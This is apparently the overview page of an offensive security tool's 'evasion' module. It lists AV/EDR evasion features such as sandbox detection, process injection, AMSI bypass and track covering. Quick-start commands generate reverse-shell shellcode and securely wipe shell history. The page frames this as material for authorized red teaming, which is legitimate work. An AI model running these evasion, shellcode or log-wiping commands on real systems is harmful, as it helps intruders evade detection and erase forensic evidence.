# Evasion Domain

> AV/EDR evasion techniques for authorized penetration testing.

## Overview

The `evasion` domain provides multi-layer techniques to avoid detection by antivirus, EDR, and forensic analysis tools. These capabilities are essential for red team operations and authorized security assessments.

## Warning

These techniques are for **authorized security testing only**. Unauthorized use may violate laws and ethical guidelines. Always obtain proper authorization before using these features.

## Available Resources

| Resource | Description | Key Commands |
|----------|-------------|--------------|
| [`sandbox`](01-sandbox.md) | Sandbox/VM detection | `check`, `score`, `delay` |
| [`obfuscate`](02-obfuscate.md) | String obfuscation | `xor`, `base64` |
| [`network`](03-network.md) | Network evasion | `jitter`, `beacon` |
| [`memory`](04-memory.md) | Memory encryption | `encrypt`, `demo`, `vault` |
| [`antidebug`](05-antidebug.md) | Anti-debugging | `quick`, `full`, `timing` |
| [`apihash`](06-apihash.md) | API hashing | `hash`, `lookup`, `list` |
| [`controlflow`](07-controlflow.md) | Control flow obfuscation | `demo`, `predicates`, `substitute` |
| [`strings`](08-strings.md) | String encryption | `encrypt`, `sensitive`, `demo` |
| [`inject`](09-inject.md) | Process injection | `shellcode`, `encode`, `list` |
| [`amsi`](10-amsi.md) | AMSI bypass (Windows) | `powershell`, `csharp`, `providers` |
| [`tracks`](11-tracks.md) | Track covering | `scan`, `clear`, `sessions`, `command` |

## Quick Start

```bash
# Check if running in sandbox/VM
rb evasion sandbox check

# Encrypt a sensitive string
rb evasion strings encrypt "my_api_key"

# Generate shellcode
rb evasion inject shellcode reverse --ip 10.0.0.1 --port 4444

# Demo secure vault for credentials
rb evasion memory vault

# Check for debuggers
rb evasion antidebug quick

# Scan for history files
rb evasion tracks scan

# Secure wipe shell history
rb evasion tracks clear --secure
```

## Detection Layers

| Layer | Detection Method | Our Evasion |
|-------|-----------------|-------------|
| **Static (File)** | SHA256 hash, strings, imports | Mutation, obfuscation |
| **Heuristic** | Code patterns, entropy | Dead code, junk insertion |
| **Behavioral** | API calls, memory patterns | Direct syscalls, sandbox detection |
| **Network** | C2 patterns, known domains | Domain fronting, jitter |
| **Forensic** | Memory dumps, disk analysis | Encryption, decoys |

## Use Cases

1. **Red Team Operations** - Evade enterprise security during authorized assessments
2. **Penetration Testing** - Test AV/EDR effectiveness
3. **CTF Competitions** - Bypass security challenges
4. **Security Research** - Understand detection mechanisms

## Related Domains

- [exploit](../exploit/00-overview.md) - Exploitation techniques
- [access](../access.md) - Credential access
- [collection](../collection.md) - Data collection
